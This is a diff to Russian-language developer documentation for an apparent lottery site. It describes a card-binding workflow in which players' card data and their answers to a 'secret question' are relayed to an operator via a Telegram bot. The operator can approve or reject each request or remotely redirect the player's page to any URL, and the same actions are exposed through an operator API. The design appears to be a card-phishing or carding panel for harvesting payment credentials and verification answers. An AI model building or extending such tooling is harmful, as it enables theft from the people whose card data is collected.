@@ -183,3 +183,16 @@ docker compose logs app --since 2m
 - `e2e/cabinet.spec.ts` — мобильные сценарии кабинета; запуск требует `E2E_EMAIL`/`E2E_PASSWORD` существующего аккаунта.
 - Локальная песочница v0 без БД: `/cabinet*` отдаёт 500 — проверять на сервере.
 - E2E-сценарий кабинета (док, карта, поддержка) на мобильной ширине.
+
+## Заявки на привязку карт (номера, перенаправление, API)
+
+- Каждая заявка получает уникальный номер `BL-XXXXXX` (`payment_card.requestNo`, миграция `0007_card_request_no`). Логика — `lib/card-requests.ts`.
+- В Telegram приходит только `№ BL-XXXXXX` + данные карты, без кнопок. Ответ на секретный вопрос приходит как `№ BL-XXXXXX` + ответ (без текста вопроса).
+- Команды оператора в личке с ботом (ответом на сообщение заявки или с номером в тексте):
+  - `BL-XXXXXX https://страница` — игрок со страницы `/cabinet/cards/[id]` автоматически перенаправляется на ссылку (`payment_card.redirectUrl`, опрос каждые 2.5 с).
+  - `BL-XXXXXX ok` / `+` — подтвердить карту; `BL-XXXXXX no` / `-` — отклонить.
+- Operator API (ключ `OPERATOR_API_KEY` в `/opt/bytoloto/.env`, заголовок `Authorization: Bearer <key>`), файлы `app/api/v1/card-requests/**`, `lib/operator-api.ts`:
+  - `GET /api/v1/card-requests?status=pending&limit=50` — список заявок.
+  - `GET /api/v1/card-requests/BL-XXXXXX` — одна заявка.
+  - `POST /api/v1/card-requests/BL-XXXXXX` с телом `{"action":"redirect","url":"https://..."}` | `{"action":"approve"}` | `{"action":"reject"}`.
+  - Ответы: 401 неверный ключ, 404 нет заявки, 409 заявка закрыта, 503 ключ не задан.
